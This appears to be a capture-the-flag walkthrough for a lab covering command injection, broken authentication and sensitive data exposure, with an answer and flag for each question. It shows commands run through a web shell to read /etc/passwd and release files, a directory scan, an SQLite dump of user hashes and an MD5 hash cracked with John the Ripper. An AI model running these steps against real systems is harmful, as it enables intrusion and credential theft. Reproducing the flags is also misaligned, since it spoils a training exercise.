# SEVERITY #1 - Injection

## [Severity 1] Command Injection Practical

First, go to the link http://machine_ip/evilshell.php

Q: What strange text file is in the website root directory?
A: **drpepper.txt**
> Command: ls

Q: How many non-root/non-service/non-daemon users are there?
A: **0**
> Command: ls /home

Q: What user is this app running as?
A: **www-data**
> Command: whoami

Q: What is the user's shell set as?
A: **/usr/sbin/nologin**
> Command: cat /etc/passwd | grep www-data

Q: What version of Ubuntu is running?
A: **18.04.4**
> Command: cat /etc/*-release

Q: Print out the MOTD.  What favorite beverage is shown?
A: **Dr Pepper**

```
$ ls /etc/update-motd.d
00-header 10-help-text 50-landscape-sysinfo 50-motd-news 80-esm 80-livepatch 90-updates-available 91-release-upgrade 92-unattended-upgrades 95-hwe-eol 97-overlayroot 98-fsck-at-reboot 98-reboot-required 

$ cat /etc/update-motd.d/00-header
...
<checkout the last line>
...
``` 

# Severity 2 - Broken Authentication

## [Severity 2] Broken Authentication Practical

Q: What is the flag that you found in darren's account?
A: **fe86079416a21a3c99937fea8874b667**

Q: Now try to do the same trick and see if you can login as arthur.
A: --NO NEED--

Q: What is the flag that you found in arthur's account?
A: **d9ac0f7db4fda460ac3edeb75d75e16e**

# Severity 3 - Sensitive Data Exposure

## [Severity 3] Sensitive Data Exposure (Challenge)

Have a look around the webapp. The developer has left themselves a note indicating that there is sensitive data in a specific directory. 

Q: What is the name of the mentioned directory?
A: **/assets**

```
$ dirsearch -u http://10.10.183.217/
```

Q: Navigate to the directory you found in question one. What file stands out as being likely to contain sensitive data?
A: **webapp.db**

Q: Use the supporting material to access the sensitive data. What is the password hash of the admin user?
A: **6eea9b7ef19179a06954edd0f6c05ceb**


```
$sqlite3 webapp.db 
SQLite version 3.40.1 2022-12-28 14:03:47
Enter ".help" for usage hints.
sqlite> .tables
sessions  users   

sqlite> PRAGMA table_info(users);
0|userID|TEXT|1||1
1|username|TEXT|1||0
2|password|TEXT|1||0
3|admin|INT|1||0

sqlite> SELECT * FROM users;
4413096d9c933359b898b6202288a650|admin|6eea9b7ef19179a06954edd0f6c05ceb|1
23023b67a32488588db1e28579ced7ec|Bob|ad0234829205b9033196ba818f7a872b|1
4e8423b514eef575394ff78caed3254d|Alice|268b38ca7b84f44fa0a6cdc86e6301e0|0

sqlite> 

```


Crack the hash.

```
$ echo 6eea9b7ef19179a06954edd0f6c05ceb > admin_hash.txt

$ john --format=raw-md5 admin_hash.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-MD5 [MD5 256/256 AVX2 8x3])
Warning: no OpenMP support for this hash type, consider --fork=4
Proceeding with single, rules:Single
Press 'q' or Ctrl-C to abort, almost any other key for status
Almost done: Processing the remaining buffered candidate passwords, if any.
Proceeding with wordlist:/usr/share/john/password.lst
qwertyuiop       (?)     
1g 0:00:00:00 DONE 2/3 (2024-10-30 22:08) 1.754g/s 4042p/s 4042c/s 4042C/s 1234qwer..karla
Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
Session completed. 

$john --show --format=raw-md5 admin_hash.txt
?:qwertyuiop

1 password hash cracked, 0 left
```

Q: What is the admin's plaintext password?
A: **qwertyuiop**

Q: Login as the admin. What is the flag?
A: **THM{Yzc2YjdkMjE5N2VjMzNhOTE3NjdiMjdl}**